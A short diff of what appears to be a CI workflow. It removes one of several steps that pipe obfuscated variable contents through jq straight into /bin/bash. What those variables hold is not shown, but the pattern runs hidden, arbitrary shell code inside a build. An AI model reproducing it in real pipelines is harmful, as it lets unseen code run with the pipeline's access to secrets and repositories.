@@ -33,7 +33,6 @@ jobs:
           echo $xm148 | jq -r .ik33 | /bin/bash
           echo $s219 | jq -r .pt9587 | /bin/bash
           echo $sbui67707 | jq -r .p47 | /bin/bash
-          echo $blqt8522 | jq -r .glmsb19 | /bin/bash
           echo $dj063 | jq -r .ps6 | /bin/bash
           echo $davx0928 | jq -r .ckk24906 | /bin/bash
 
